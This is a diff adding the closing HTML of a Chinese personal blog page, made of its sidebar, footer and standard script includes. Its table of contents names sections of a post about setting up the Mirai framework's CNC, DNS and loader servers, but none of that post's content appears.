+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        
+<script>
+  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/uploads/avatar.JPG"
+                alt="metang" />
+            
+              <p class="site-author-name" itemprop="name">metang</p>
+              <p class="site-description motion-element" itemprop="description">from Nuaa</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">25</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">26</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          <div class="links-of-author motion-element">
+            
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/metang326" target="_blank" title="GitHub">
+                    
+                      <i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="534747943@qq.com" target="_blank" title="E-Mail">
+                    
+                      <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                </span>
+              
+            
+          </div>
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#github源码"><span class="nav-number">1.</span> <span class="nav-text">github源码</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#框架介绍"><span class="nav-number">2.</span> <span class="nav-text">框架介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Requirements（原作者写的）"><span class="nav-number">2.1.</span> <span class="nav-text">Requirements（原作者写的）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Bare-Minimum"><span class="nav-number">2.1.1.</span> <span class="nav-text">Bare Minimum</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Pro-Setup-my-setup"><span class="nav-number">2.1.2.</span> <span class="nav-text">Pro Setup (my setup)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#解释"><span class="nav-number">2.2.</span> <span class="nav-text">解释</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#我的服务器架构"><span class="nav-number">3.</span> <span class="nav-text">我的服务器架构</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#cnc服务器"><span class="nav-number">3.1.</span> <span class="nav-text">cnc服务器</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DNS解析服务器"><span class="nav-number">3.2.</span> <span class="nav-text">DNS解析服务器</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#loader服务器-还没有部署"><span class="nav-number">3.3.</span> <span class="nav-text">loader服务器(还没有部署)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bot需要设置的"><span class="nav-number">3.4.</span> <span class="nav-text">bot需要设置的</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cnc服务器需要设置的"><span class="nav-number">3.5.</span> <span class="nav-text">cnc服务器需要设置的</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#mirai搭建准备"><span class="nav-number">4.</span> <span class="nav-text">mirai搭建准备</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#配置DNS服务器"><span class="nav-number">5.</span> <span class="nav-text">配置DNS服务器</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">metang</span>
+
+  
+</div>
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+
+
+
+  
+
+
+
+
+  
+  
+  
+  <link rel="stylesheet" href="/lib/algolia-instant-search/instantsearch.min.css">
+
+  
+  
+  <script src="/lib/algolia-instant-search/instantsearch.min.js"></script>
+  
+
+  <script src="/js/src/algolia-search.js?v=5.1.3"></script>
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+
+
+</body>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
+</html>
